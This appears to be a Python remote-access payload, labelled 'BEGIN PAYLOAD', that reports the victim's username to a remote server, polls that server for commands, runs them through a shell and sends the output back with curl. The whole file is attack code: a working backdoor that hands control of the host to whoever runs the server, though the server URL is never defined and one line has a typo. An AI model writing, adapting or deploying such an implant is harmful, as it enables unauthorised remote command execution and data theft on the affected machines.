
### BEGIN PAYLOAD ###

import requests, os
from subprocess import Popen, PIPE

def run(cmd):
	if " " in cmd and cmd.split(" ")[0] == "cd":
		try:
			newdir = cmd.split(" ")[1]
			os.chdir(newdir)
			return "cd: %s: ok" % newdir
		except:
			return "cd: %s: fail" & newdir
	else:
		res = Popen(cmd,stdout=PIPE,shell=True).communicate()[0]
		try:
			return res.decode()
		except:
			return str(res)

def send(text):
	os.system("echo \"%s\" | curl -F c=@- %s" % (text,url))
def recv():
	return requests.get(url).content

def handle(msg):
	if ":" in msg and msg.split(":")[0] == "cmd":
		cmd = msg.split(":"); cmd.remove(cmd[0]); cmd = ':'.join(cmd)
		res = run(cmd)
		send("result#"+res)
		ok = recv()
		while not ok == "ok":
			ok = recv()
		send("getcmd")
	elif msg == "ok":
		send("getcmd")
	else:
		pass

# MAIN
agent = run("whoami").strip()
send("connect:"+agent)
old = recv()
while not old == "ok":
	old = recv()
while True:
	new = recv()
	if not new == old:
		old = new
		handle(new)